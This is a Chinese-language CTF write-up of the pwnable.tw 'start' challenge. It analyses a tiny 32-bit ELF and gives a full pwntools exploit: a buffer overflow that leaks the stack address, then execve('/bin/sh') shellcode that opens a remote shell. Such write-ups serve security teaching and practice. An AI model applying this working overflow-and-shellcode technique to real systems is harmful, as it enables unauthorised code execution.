---
title: "Pwnable Start wp"
date: 2026-09-10 00:00:00 +0800
last_modified_at: 2026-09-10 00:00:00 +0800
categories: [CTF, Pwnable]
tags: [Pwn]
description: "Pwnable wp"
media_subpath: /assets/img/posts/Pwnable-Start-wp
image:
  path: Pwnable.png
  alt: Pwnable wp
---

## 格式
file：
```
/mnt/c/Users/Hamic/Downloads/start: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), statically linked, not stripped
```

Syscall table：
https://x86.syscall.sh/

| Registers | `int 0x80` 用途                                         |
| --------- | ----------------------------------------------------- |
| `EAX`     | syscall 編號                                            |
| `EBX`     | 第 1 個參數                                               |
| `ECX`     | 第 2 個參數                                               |
| `EDX`     | 第 3 個參數                                               |
| `ESI`     | 第 4 個參數                                               |
| `EDI`     | 第 5 個參數                                               |
| `EAX`     | syscall 回傳值                                           |
| `EBP`     | Base Pointer／Frame Pointer，常用於定位 function stack frame |
| ``ESP``   | 指向目前 stack 頂端                                         |
| `EIP`     | 指向目前正在執行的指令                                           |
| `EFLAGS`  | `CPU 狀態旗標，例如 Zero Flag、Carry Flag`                    |

> 補充：
> 32-bit ELF 的 `int 0x80` 就像是 64-bit ELF 的 `syscall`

## 防禦機制
checksec：
```bash
[*] '/mnt/c/Users/Hamic/Downloads/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

## 分析
Disassembly：
```
_start:
08048060  push    esp {__return_addr} {var_4} 
08048061  push    _exit {var_8}
08048066  xor     eax, eax  {0x0}
08048068  xor     ebx, ebx  {0x0}
0804806a  xor     ecx, ecx  {0x0}
0804806c  xor     edx, edx  {0x0}
0804806e  push    0x3a465443 {var_c}
08048073  push    0x20656874 {var_10}
08048078  push    0x20747261 {var_14}
0804807d  push    0x74732073 {var_18}
08048082  push    0x2774654c {var_1c}
08048087  mov     ecx, esp {var_1c}
08048089  mov     dl, 0x14
0804808b  mov     bl, 0x1
0804808d  mov     al, 0x4
0804808f  int     0x80
08048091  xor     ebx, ebx  {0x0}
08048093  mov     dl, 0x3c
08048095  mov     al, 0x3
08048097  int     0x80
08048099  add     esp, 0x14
0804809c  retn     // pop eip


0804809d    void _exit() __noreturn

0804809d  5c                 pop     esp
0804809e  31c0               xor     eax, eax
080480a0  40                 inc     eax  {0x1}
080480a1  cd80               int     0x80
{ Does not return }
```

Decompilation：
```c++
08048060    int32_t _start()

08048061        void (* var_8)() __noreturn = &_exit  
08048082        int32_t var_1c
08048082        __builtin_strncpy(dest: &var_1c, src: "Let\'s start the CTF:", count: 0x14)
08048087        int32_t* ecx = &var_1c
0804808f        int32_t eax_2
0804808f        int32_t edx_2
0804808f        eax_2, edx_2 = syscall(sys_write {4}, fd: 1, buf: ecx, count: 0x14) // eax_2 = 0x4 => 0x14, edx_2 = 0x14
08048093        edx_2.b = 0x3c // edx_2 = 0x3c
08048095        eax_2.b = 3 // eax_2 =  0x3
0804809c        return syscall(eax_2, 0, ecx, edx_2) // syscall(0x3, 0, ecx, 0x3c) = read(0, ecx, 0x3c)


0804809d    void _exit() __noreturn

080480a1        int32_t entry_ebx
080480a1        syscall(sys_exit {1}, status: entry_ebx) // ebx = 0 , syscall(sys_exit {1}, status: 0) => exit(0)
080480a1        noreturn
```

stack：
```
buf[0x14] = "Let\'s start the CTF:"
_exit 
save esp
```

剛開始會放入`進入 _start 時的 ESP`，再放入`_exit() addr`，接者把 `Let's start the CTF:` 寫入 `buf[0x14]`，透過 `write` 輸出 `Let's start the CTF:`，然後 `read` 可寫入 `0x3c bytes` 到 `buf`，然後 `ESP` 會往後跳 `0x14` 也就是挑到 `_exit `，`ret` 到 `_exit()` 後會跑 `exit(0)` 並結束

## 利用
在`read`的時候可以寫超過`buf[0x14]`大小的內容，可以蓋到後面的`_exit addr`，這樣我們就可以任意跳到想要的位置，而這題沒有寫好的後門，所以我們需要自己寫在 `stack` 上，但我們需要先知道 `stack addr`，所以我們想要 `leak` 出 `save esp`，可以透過把本來的 `_exit` 改成 `0x08048087` ，再次透過 `write` 輸出 `stack` 上的值，而這時會從 `ESP - 4` 開始印資料，所以前 `4 byte` 就是 `save esp`，知道 `stack addr` 後就是寫 `shellcode` 並跳上去放 `shellcode addr` 執行

Exploit：

```python
from pwn import *

#r = process("./start")
r = remote("chall.pwnable.tw", 10000)

r.recvuntil(b"Let's start the CTF:")


playload = b"A" * 0x14 + p32(0x08048087)
r.send(playload)

leaked_esp = u32(r.recvn(4))
success(f"old esp => {leaked_esp:#x}")
new_esp = leaked_esp + 0x14
success(f"new esp => {new_esp:#x}")

shellcode = asm("""
    mov eax, 0x0b
    push 0x0068732f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
""")
playload_2 = b"A" * 0x14 + p32(new_esp) + shellcode
r.send(playload_2)
r.interactive()
```

## 圖解
> playload 有分 1、2，第五張圖開始就是表示 2

![](file-20260910110736771.png)

![](file-20260910110736814.png)

![](file-20260910110736880.png)

![](afile-20260910110736918.png)

![](file-20260910110736971.png)

![](file-20260910110737013.png)

![](file-20260910110737046.png)

![](file-20260910110737079.png)

![](file-20260910110737114.png)
